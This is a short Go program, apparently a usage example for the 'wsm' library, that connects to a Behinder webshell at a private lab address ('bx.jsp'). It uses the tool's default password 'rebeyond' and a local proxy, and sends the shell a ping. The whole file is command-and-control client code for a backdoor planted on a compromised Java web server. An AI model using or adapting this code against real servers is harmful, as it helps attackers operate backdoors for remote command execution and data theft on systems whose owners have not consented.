package main

import (
	"github.com/Go0p/wsm"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/behinder"
	"log"
)

func main() {
	log.SetFlags(log.Lshortfile)
	info := wsm.BehinderInfo{
		BaseShell: shell.BaseShell{
			Url:      "http://172.20.10.2:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx := wsm.NewBehinder(info)
	p := &behinder.PingParams{
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: false, NotEncrypt: true},
		Content:        "xxxxxxx",
	}
	bx.Ping(p)
}
